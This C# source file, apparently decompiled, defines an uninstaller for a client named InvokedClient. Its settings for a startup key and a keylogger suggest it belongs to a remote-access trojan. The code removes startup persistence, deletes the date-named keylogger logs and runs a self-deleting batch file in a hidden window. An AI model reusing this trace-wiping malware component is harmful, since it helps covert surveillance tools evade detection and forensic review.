

using InvokedClient.Config;
using InvokedClient.IO;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;


namespace InvokedClient.Setup
{
	public class ClientUninstaller : ClientSetupBase
	{
		public void Uninstall()
		{
			if (Settings.STARTUP)
				new ClientStartup().RemoveFromStartup(Settings.STARTUPKEY);
			if (Settings.ENABLELOGGER && Directory.Exists(Settings.LOGSPATH))
			{
				Regex reg = new Regex("^\\d{4}\\-(0[1-9]|1[012])\\-(0[1-9]|[12][0-9]|3[01])$");
				foreach (string path in ((IEnumerable<string>)Directory.GetFiles(Settings.LOGSPATH, "*", SearchOption.TopDirectoryOnly)).Where<string>((Func<string, bool>)(path => reg.IsMatch(Path.GetFileName(path)))).ToList<string>())
				{
					try
					{
						File.Delete(path);
					}
					catch (Exception ex)
					{
					}
				}
			}
			string uninstallBatch = BatchFile.CreateUninstallBatch(Application.ExecutablePath);
			Process.Start(new ProcessStartInfo()
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				FileName = uninstallBatch
			});
		}
	}
}